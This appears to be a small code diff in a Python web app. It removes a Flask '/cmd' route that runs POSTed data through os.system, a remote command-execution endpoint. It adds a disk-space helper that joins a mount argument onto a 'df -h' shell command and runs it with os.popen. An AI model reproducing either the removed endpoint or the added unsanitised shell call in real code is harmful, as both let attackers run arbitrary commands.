@@ -1,4 +1,3 @@
-@app.route('/cmd', methods=['POST'])
-def cmd():
-    data = request.form.get('data')
-    os.system(data)
+def free_space(mount):
+    import os
+    return os.popen("df -h " + mount).read()
